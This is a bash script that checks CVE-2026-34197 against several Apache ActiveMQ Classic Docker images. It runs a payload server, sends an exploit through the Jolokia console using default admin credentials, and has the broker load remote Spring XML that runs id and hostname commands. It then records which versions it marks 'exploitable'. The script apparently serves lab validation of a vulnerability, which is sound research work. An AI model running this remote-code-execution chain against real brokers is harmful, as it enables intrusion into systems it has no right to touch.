#!/usr/bin/env bash
# CVE-2026-34197 multi-version validation matrix.
# Decoupled HTTP server (long-lived) + per-version exploit.
set -uo pipefail

VERSIONS=(
  "apache/activemq-classic:5.18.3"
  "apache/activemq-classic:5.18.6"
  "apache/activemq-classic:6.1.4"
  "apache/activemq-classic:6.1.7"
)

POC=/root/activemq-lab/poc/poc.py
RESULTS=/root/activemq-lab/poc/results.tsv
DOCKER0=$(ip -4 addr show docker0 | awk '/inet /{print $2}' | cut -d/ -f1)
echo "version	verdict	uid_output	host_output	jvm_version" > "$RESULTS"

# Long-lived payload server, killed at exit
python3 "$POC" --serve --lhost 0.0.0.0 --lport 8888 \
  > /tmp/payload-server.log 2>&1 &
SERVER_PID=$!
sleep 1

cleanup() {
  kill "$SERVER_PID" 2>/dev/null || true
  docker rm -f amq-test >/dev/null 2>&1 || true
}
trap cleanup EXIT

if ! curl -sf "http://127.0.0.1:8888/" >/dev/null 2>&1 ; then
  # 404 is fine — server is up but we asked for an unknown path
  if ! ss -tlnp 2>/dev/null | grep -q ':8888'; then
    echo "[!] payload server failed to start"; cat /tmp/payload-server.log; exit 1
  fi
fi
echo "[*] payload server up (pid=$SERVER_PID, listening on $DOCKER0:8888)"

for IMG in "${VERSIONS[@]}"; do
  TAG=${IMG##*:}
  echo
  echo "================================================================"
  echo "  Testing $IMG"
  echo "================================================================"

  docker rm -f amq-test >/dev/null 2>&1 || true
  if ! docker run -d --name amq-test -p 8161:8161 "$IMG" >/dev/null; then
    echo "$TAG	docker_run_failed			" >> "$RESULTS"
    continue
  fi

  # Wait for the web console — health check takes 30s+ on cold start
  ready=0
  for i in $(seq 1 90); do
    code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 2 \
              -u admin:admin -H 'Origin: http://127.0.0.1:8161' \
              "http://127.0.0.1:8161/api/jolokia/version" || echo 000)
    if [ "$code" = "200" ]; then ready=1; break; fi
    sleep 1
  done
  if [ "$ready" != "1" ]; then
    echo "[!] $TAG: web console did not come up"
    docker logs --tail 30 amq-test
    echo "$TAG	console_not_ready			" >> "$RESULTS"
    continue
  fi
  echo "[+] $TAG: web console ready"

  MARKER="/tmp/pwned-$TAG"
  CMD="(id; hostname; java -version 2>&1 | head -1; echo VULN-$TAG) > $MARKER"

  # Send exploit — server is already up
  python3 "$POC" \
    --target 127.0.0.1 --port 8161 \
    --lhost "$DOCKER0" --lport 8888 \
    --user admin --password admin \
    --command "$CMD" 2>&1 | sed 's/^/    /'

  # Broker fires Spring XML load deferred; give it time
  echo "[*] $TAG: waiting 12s for deferred Spring load + ProcessBuilder"
  sleep 12

  if docker exec amq-test test -f "$MARKER" 2>/dev/null; then
    out=$(docker exec amq-test cat "$MARKER" 2>/dev/null)
    UID=$(printf '%s\n' "$out" | grep -m1 '^uid=' || true)
    HOST=$(printf '%s\n' "$out" | sed -n '2p' || true)
    JVER=$(printf '%s\n' "$out" | sed -n '3p' || true)
    echo "[+] $TAG: RCE CONFIRMED"
    printf '%s\n' "$out" | sed 's/^/    /'
    printf '%s\t%s\t%s\t%s\t%s\n' "$TAG" "exploitable" "$UID" "$HOST" "$JVER" >> "$RESULTS"
  else
    echo "[!] $TAG: marker file not found"
    docker logs --tail 30 amq-test 2>&1 | tail -10 | sed 's/^/    /'
    echo "$TAG	failed_no_marker			" >> "$RESULTS"
  fi
done

echo
echo "================================================================"
echo "  RESULTS"
echo "================================================================"
column -t -s $'\t' "$RESULTS"
